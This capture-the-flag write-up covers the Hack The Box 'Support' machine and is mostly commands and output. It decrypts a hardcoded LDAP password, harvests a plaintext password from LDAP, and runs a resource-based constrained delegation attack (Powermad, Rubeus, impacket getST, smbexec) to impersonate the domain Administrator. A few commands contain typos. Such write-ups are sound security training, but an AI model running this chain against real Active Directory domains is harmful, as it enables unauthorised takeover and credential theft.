![support.png](support.png)

# Support

## Enum
```bash
cat scans/nmap.initial
# Nmap 7.92 scan initiated Tue Aug 23 13:03:03 2022 as: nmap -sC -oN nmap.initial support.htb
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.070s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-08-23T12:03:12
|_  start_date: N/A

# Nmap done at Tue Aug 23 13:03:50 2022 -- 1 IP address (1 host up) scanned in 46.77 seconds
```


## DNS enumeration
```bash
dig ANY @10.10.11.174 support.htb

; <<>> DiG 9.18.7-1-Debian <<>> ANY @10.10.11.174 support.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55068
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.                   IN      ANY

;; ANSWER SECTION:
support.htb.            600     IN      A       10.10.11.174
support.htb.            3600    IN      NS      dc.support.htb.
support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.support.htb.         3600    IN      A       10.10.11.174

;; Query time: 52 msec
;; SERVER: 10.10.11.174#53(10.10.11.174) (TCP)
;; WHEN: Thu Oct 20 18:05:14 IST 2022
;; MSG SIZE  rcvd: 136
```

Adding those to our hosts file

## SMB enumeration
```bash
nbtscan 10.10.11.174
Doing NBT name scan for addresses from 10.10.11.174

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
```
```bash
smbmap -H 10.10.11.174
[+] IP: 10.10.11.174:445        Name: support.htb
```
```bash
smbmap -H 10.10.11.174 -u null -p null
[+] Guest session       IP: 10.10.11.174:445    Name: support.htb
[!] Error:  (<class 'impacket.smbconnection.SessionError'>, 'smbmap', 1337)
```
```bash
smbmap -H 10.10.11.174 -u guest
[+] IP: 10.10.11.174:445        Name: support.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        support-tools                                           READ ONLY       support staff tools
        SYSVOL                                                  NO ACCESS       Logon server share
```

N.B Guest no pass worked nowhere
```bash
smbclient  -U Guest --no-pass //10.10.11.174/ADMIN$
session setup failed: NT_STATUS_LOGON_FAILURE
smbclient  -U Guest --no-pass //10.10.11.174/C$                                 1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
smbclient  -U Guest --no-pass //10.10.11.174/IPC$                               1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
smbclient  -U Guest --no-pass //10.10.11.174/NETLOGON                           1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
smbclient  -U Guest --no-pass //10.10.11.174/SYSVOL                             1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
smbclient  -U Guest --no-pass //10.10.11.174/support-tools                      1 ⨯
session setup failed: NT_STATUS_LOGON_FAILURE
```

But Guest empty pass did for some shares...
```bash
smbclient  -U Guest --password="" //10.10.11.174/IPC$                           1 ⨯
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \>
```
```bash
smbclient  -U Guest --password="" //10.10.11.174/NETLOGON
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \>
```

The only one where we can actually see files is the support-tools one 
```bash
smbclient  -U Guest --password="" //10.10.11.174/support-tools
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022

                4026367 blocks of size 4096. 968811 blocks available
smb: \>
```
Downloading all the files locally, the UserInfo is a dotnet binary, so after moving it to a windows machine to decompile it with dnspy, we fin that it has hardcoded credentials. 


## Hardcoded Credentials 
```csharp
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```

It is stored not in plaintext but in some kind of self proclaimed encryption.   
Which we can just unpack in python: 
```python
import base64

enc_password = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

array = base64.b64decode(enc_password)

array2 = []
for i in range(len(array)):
    array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))

print("".join(array2))
```

And we get the password
```bash
python3 decrypt.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

So by the looks of it, UserInfo is connecting to ldap with that password and the user `support\\ldap` 
```csharp
// Token: 0x06000012 RID: 18 RVA: 0x00002190 File Offset: 0x00000390
public LdapQuery()
{
	string password = Protected.getPassword();
	this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	this.entry.AuthenticationType = AuthenticationTypes.Secure;
	this.ds = new DirectorySearcher(this.entry);
}
```


## Dump the LDAP domain 

```bash
ldapsearch \
    -x \
    -H ldap://<IP> \
    -D '<DOMAIN>\<username>' \
    -w '<password>' \
    -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
```bash
lapsearch \
    -x \
    -H ldap://dc.support.htb \
    -D 'support\ldap' \
    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
    -b "CN=Users,DC=SUPPORT,DC=HTB" | \
tee ldap_dc.support.htb.txt
```
```bash
ldapdomaindump \
    -u 'support\ldap' \
    -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
    dc.support.htb
```

## Plaintext credentials in the LDAP records
There's a plaintext password in the ldap data under support info, not sure how likely this is to happen in the real world but, ok. 
```bash
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20221020152249.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 81982
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133107529699009244
```


## Domain exploration with BloodHound

We can use this password to winrm in there as support and run some SharpHound
```bash
evil-winrm -i dc.support.htb -u support -p 'Ironside47pleasure40Watchful'
upload /home/user/Tools/SharpHound/SharpHound.exe sh.exe
```

```bash
sh.exe -c all -d support.htb -DomainController 127.0.0.0.1
download 20220910154816_BloodHound.zip
```

And after looking at this data in bloodhound we can see that support has “GenericAll” permission over the AD-Object “dc.support.htb”, so we can do a Resource-based Constrained Delegation Kerberos attack.



## Privesc "GenericAll" -> Resource-based Constrained Delegation Kerberos attack 

[https://cybergladius.com/htb-walkthrough-support](https://cybergladius.com/htb-walkthrough-support)

On the DC we'll be using powermad to add a user, then built in AD tools to give it Constrained Delegation Priviledges, Rubeus to generate hashes for the account. 

Then from our own system we'll use impacket to leverage the fake user and request a TGT as the Administrator user.

```bash
git clone https://github.com/Kevin-Robertson/Powermad.git
git clone https://github.com/GhostPack/Rubeus.git
```

Upload the tools on the DC over winrm
```bash
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
```

Set variables
```bash
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"
```

Add the new fake computer object to AD with powermad
```bash
Import-Module ./pm.ps1

New-MachineAccount \
    -MachineAccount (Get-Variable -Name "FakePC").Value \
    -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) \
    -Verbose
```

With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
```bash
Set-ADComputer (Get-Variable -Name "targetComputer").Value \
    -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
```

With Built-in AD modules, check that the last command worked.
```bash
Get-ADComputer (Get-Variable -Name "targetComputer").Value \
    -Properties PrincipalsAllowedToDelegateToAccount
```

Use Rubeus to Generate Hashes for the fake account we just created
```bash
./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
```

So basically so far we created a fake user with powermad from the domain controller,   
We then used built in AD tools to give it Constrained Delegation Privilege,   
Which means we gave it the right to impersonate anybody.   
And we used Rubeus to generate hashes based on the password we chose for our fake user account.  
From our own system we can now use Impacket to leverage the fake account to request a TGT as administrator.

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
```
```bash
/home/user/Tools/impacket/examples/getST.py \
    support.htb/FAKE01 \
    -dc-ip dc.support.htb \
    -impersonate administrator \
    -spn http/dc.support.htb \
    -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
```

And finally we can use that TGT to connect as administrator over smb
```
export KRB5CCNAME=administrator.ccache
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
```
